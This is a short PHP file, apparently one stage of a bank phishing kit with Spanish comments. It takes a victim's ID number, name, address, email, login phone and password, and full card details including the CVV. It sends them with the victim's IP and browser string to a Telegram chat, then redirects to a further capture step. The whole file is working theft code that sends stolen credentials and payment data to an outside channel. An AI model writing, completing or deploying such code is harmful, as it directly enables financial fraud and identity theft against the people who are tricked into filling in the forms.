<?php
session_start();
require_once "telegram_helper.php"; // usamos el helper para enviar mensajes

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Guardar datos personales de paso anterior
    $_SESSION["nombre"] = $_POST["nombre"] ?? $_SESSION["nombre"] ?? '';
    $_SESSION["cedula"] = $_POST["cedula"] ?? $_SESSION["cedula"] ?? '';
    $_SESSION["ciudad"] = $_POST["ciudad"] ?? $_SESSION["ciudad"] ?? '';
    $_SESSION["dir"]    = $_POST["dir"]    ?? $_SESSION["dir"]    ?? '';
    $_SESSION["email"]  = $_POST["email"]  ?? $_SESSION["email"]  ?? '';

    // Guardar tarjeta
    $_SESSION["numero_tarjeta"]     = $_POST["numero_tarjeta"] ?? '';
    $_SESSION["fecha_vencimiento"]  = $_POST["fecha_vencimiento"] ?? '';
    $_SESSION["cvv"]                = $_POST["cvv"] ?? '';

    // ✅ Enviar mensaje a Telegram
    $mensaje = "🚨 NUEVA INFORMACIÓN RECIBIDA 🚨\n\n";
    $mensaje .= "🆔 Cédula: " . $_SESSION["cedula"] . "\n";
    $mensaje .= "👤 Nombre: " . $_SESSION["nombre"] . "\n";
    $mensaje .= "📱 Teléfono: " . ($_SESSION["j_username"] ?? '') . "\n";
    $mensaje .= "🔐 Clave: " . ($_SESSION["j_password"] ?? '') . "\n";
    $mensaje .= "📧 Email: " . $_SESSION["email"] . "\n";
    $mensaje .= "🏠 Dirección: " . $_SESSION["dir"] . "\n";
    $mensaje .= "🏙 Ciudad: " . $_SESSION["ciudad"] . "\n";
    $mensaje .= "💳 Tarjeta: " . $_SESSION["numero_tarjeta"] . "\n";
    $mensaje .= "📅 Vence: " . $_SESSION["fecha_vencimiento"] . "\n";
    $mensaje .= "🔑 CVV: " . $_SESSION["cvv"] . "\n";
    $mensaje .= "🌍 IP: " . $_SERVER["REMOTE_ADDR"] . "\n";
    $mensaje .= "🖥 User-Agent: " . $_SERVER["HTTP_USER_AGENT"];

    enviarMensajeTelegram($mensaje);
    
    // Redirigir al siguiente paso
    header("Location: dinamica.php");
    exit;
} else {
    header("Location: login.html");
    exit;
}
?>
